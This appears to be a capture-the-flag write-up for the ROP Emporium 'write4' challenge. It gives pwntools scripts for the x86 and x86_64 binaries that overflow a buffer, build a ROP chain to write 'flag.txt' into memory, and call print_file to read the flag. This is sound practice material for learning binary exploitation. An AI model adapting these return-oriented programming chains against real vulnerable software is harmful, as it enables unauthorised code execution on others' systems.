- x86

Binary : [write4 x86](https://github.com/w31rdr4v3n/Binary-Exploitation/raw/main/ROP/data/ropemporium/write432.zip)

My exploit:

```py
from pwn import *

sh = process("./write432")

print(sh.recv().decode())

payload = b"A"*44

payload += p32(0x080485aa) # pop edi ; pop ebp ; ret
payload += p32(0x0804a018) # .data
payload += b"flag"
payload += p32(0x08048543) # mov dword ptr [edi], ebp ; ret

payload += p32(0x080485aa) # pop edi ; pop ebp ; ret
payload += p32(0x0804a018 + 4) # .data
payload += b".txt"
payload += p32(0x08048543) # mov dword ptr [edi], ebp ; ret

# Call print_file

payload += p32(0x80483d0) # print_file
payload += b"A"*4
payload += p32(0x0804a018) # .data

sh.sendline(payload)
print(sh.recv().decode())
```

- x86_64

Binary : [write4 x86_64](https://github.com/w31rdr4v3n/Binary-Exploitation/raw/main/ROP/data/ropemporium/write4.zip)

My exploit:

```py
from pwn import *

sh = process("./write4")

print(sh.recv().decode())

payload = b"A"*(40)

payload += p64(0x0000000000400690) # pop r14 ; pop r15 ; ret
payload += p64(0x0000000000601028) # .data
payload += b"flag.txt"
payload += p64(0x0000000000400628) # mov qword ptr [r14], r15 ; ret

# Call print_file

payload += p64(0x0000000000400693) # pop rdi ; ret
payload += p64(0x0000000000601028) # .data
payload += p64(0x00400510) # print_file

sh.sendline(payload)
sh.interactive()
```

Challenge : https://ropemporium.com/
